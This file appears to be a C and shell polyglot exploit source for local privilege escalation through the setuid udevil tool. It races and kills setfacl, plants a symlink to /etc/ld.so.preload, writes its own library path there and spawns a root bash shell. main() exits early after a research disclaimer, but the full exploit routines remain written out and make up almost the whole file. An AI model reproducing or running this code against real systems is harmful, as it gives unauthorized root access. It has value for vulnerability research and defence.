#if POLYGLOT

set -x
cc -fPIC -c -pedantic -Wall -std=c11 $0 -o youdevil.o
cc -shared youdevil.o -o youdevil
YOUDEVIL=1 LD_PRELOAD=./youdevil cat
exit

#else

/*
 * This file is part of my root research repos.
 *
 * (C) 2024 by Sebastian Krahmer,
 *             sebastian [dot] krahmer [at] gmail [dot] com
 *
 * This research is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This research is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this repo.  If not, see <http://www.gnu.org/licenses/>.
 */

#define _POSIX_C_SOURCE 200112L
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>


// amount of processes away from last fork that we check for setfacl
enum { MAXPID = 16 };

const char *target = "/etc/ld.so.preload";
char cwd[256] = {0};

extern char **environ;


void die(const char *msg)
{
	fprintf(stderr, "%s\n", msg);
	exit(1);
}


int main(int, char **);


void __attribute__((constructor)) _boomsh()
{

	if (geteuid() != 0) {
		if (getenv("YOUDEVIL"))
			main(0, NULL);
		return;
	}

	if (!getenv("BOOMSH"))
		return;

	unlink(target);

	char *sh[] = {"/bin/bash", NULL};

	setuid(0);
	setgid(0);

	printf("[?] Boomsh! euid=%d\n", geteuid());
	execve(*sh, sh, NULL);
	die("[-] Failed to execute shell.");
}


int create_dir(const char *user)
{
	struct stat st;
	char media[256] = {0}, ramfs[256] = {0}, commpath[256] = {0}, comm[32] = {0};
	char *mount[] = {"/usr/bin/udevil", "mount", "ramfs", NULL};
	char *umount[] = {"/usr/bin/udevil", "umount", ramfs, NULL};
	pid_t pid = 0;
	char done = 0;

	snprintf(media, sizeof(media) - 1, "/media/%s", user);
	snprintf(ramfs, sizeof(ramfs) - 1, "/media/%s/ramfs", user);

	printf("[*] Creating user-owned `%s` ...\n", media);

	// warm FS cache
	mkdir(media, 0700);

	// Not really a for-loop. We just have one try to make the "setfacl" invocation
	// fail and fallback to a chown(). But with the sched_yield() in place there
	// is a 99% success-rate.
	for (;;) {
		memset(&st, 0, sizeof(st));
		if (stat(media, &st) == 0)
			break;

		if ((pid = fork()) == 0) {
			sleep(1);
			execve(*mount, mount, NULL);
			exit(1);
		}

		for (uint16_t range = 0; !done;) {
			range = (range + 1) % MAXPID;
			snprintf(commpath, sizeof(commpath) - 1, "/proc/%d/comm", pid + range);
			int fd = open(commpath, O_RDONLY);
			if (fd >= 0) {
				read(fd, comm, sizeof(comm) - 1);
				if (strncmp(comm, "setfacl", 7) == 0) {
					kill(pid + range, SIGKILL);
					done = 1;
				}
				sched_yield();
				close(fd);
			}

			if (waitpid(pid, NULL, done == 0 ? WNOHANG : 0) == pid)
				done = 1;
		}
	}

	sleep(3);

	// need to re-stat since udevil maybe hasn't finished chown() to user yet
	if (stat(media, &st) == 0) {
		if (st.st_uid == 0)
			die("[-] Exploit failed to create user owned media dir.");
		printf("[+] success!\n");
	} else {	// shouldt happen ...
		die("[-] Huh?");
	}

	printf("[*] Umounting ...\n");
	if ((pid = fork()) == 0) {
		execve(*umount, umount, NULL);
		exit(1);
	}
	wait(NULL);

	return 0;
}


int create_symlink(const char *user)
{
	struct stat st;

	char media[256] = {0}, ramfs[256] = {0};
	char *mount[] = {"/usr/bin/udevil", "mount", "ramfs", ramfs, NULL};
	char *umount[] = {"/usr/bin/udevil", "umount", ramfs, NULL};
	pid_t pid = 0, executor_pid = 0;

	snprintf(media, sizeof(media) - 1, "/media/%s", user);
	snprintf(ramfs, sizeof(ramfs) - 1, "/media/%s/ramfs", user);

	printf("[*] Entering executor-loop. Not using inotify so this can take some minutes ...\n");

	if ((executor_pid = fork()) == 0) {
		close(0); close(1); close(2);
		open("/dev/null", O_RDWR);
		dup2(0, 1); dup2(1, 2);

		for (;;) {
			pid_t pid = 0;
			if ((pid = fork()) == 0) {
				execve(*mount, mount, NULL);
				exit(1);
			}
			waitpid(pid, NULL, 0);
			if ((pid = fork()) == 0) {
				execve(*umount, umount, NULL);
				exit(1);
			}
			waitpid(pid, NULL, 0);
			if (stat(target, &st) == 0) {
				exit(0);
			}
		}
	}

	chdir(media);

	pid = getpid();
	fork(); fork(); fork(); fork();

	// The udevil code is more robust than you'd think first.
	// Thats the only bug I found.
	for (;;) {
		unlink("ramfs/.udevil-mount-point");
		if (rmdir("ramfs") == 0) {
			mkdir("ramfs", 0755);
			symlink(target, "ramfs/.udevil-mount-point");
		}
		if (stat(target, &st) == 0)
			break;
	}

	if (pid != getpid())
		exit(0);

	waitpid(executor_pid, NULL, 0);
	wait(NULL);

	return 0;

}


void boomsh(const char *user)
{
	int fd = open(target, O_RDWR);
	if (fd < 0)
		die("[-] Failed to open target file.");

	char me[1024] = {0};
	snprintf(me, sizeof(me) - 1, "%s/youdevil", cwd);
	write(fd, me, strlen(me));
	close(fd);

	char *a[] = {"/usr/bin/udevil", NULL}, *e[] = {"BOOMSH=1", NULL};
	execve(*a, a, e);
	die("[-] Failed to execute suid to obtain boomsh!");
}



void banner()
{

	printf("\nproudly presented by ...\n\n"
" ██████╗      ██╗    ███████╗██╗  ██╗██╗██╗     ██╗     ███████╗\n"
"██╔════╝      ╚██╗   ██╔════╝██║ ██╔╝██║██║     ██║     ██╔════╝\n"
"██║      █████╗╚██╗  ███████╗█████╔╝ ██║██║     ██║     ███████╗\n"
"██║      ╚════╝██╔╝  ╚════██║██╔═██╗ ██║██║     ██║     ╚════██║\n"
"╚██████╗      ██╔╝   ███████║██║  ██╗██║███████╗███████╗███████║\n"
" ╚═════╝      ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝\n"
"\n");

	printf("\n... ~> Shouts to nullsecurity and THC <~ ...\n");
}



int main(int argc, char **argv)
{
	banner();
	printf("\n\n!!! Disclaimer: For research purposes only !!!\n!!! Make sure to only run in safe testing environments !!!\n");
	exit(0);

	umask(0);
	getcwd(cwd, sizeof(cwd) - 1);

	printf("\n[!] Get the real deal at https://github.com/stealth/polyglots\n\n");

	const char *user = getenv("USER");
	create_dir(user);
	create_symlink(user);
	boomsh(user);

	return 0;
}

#endif

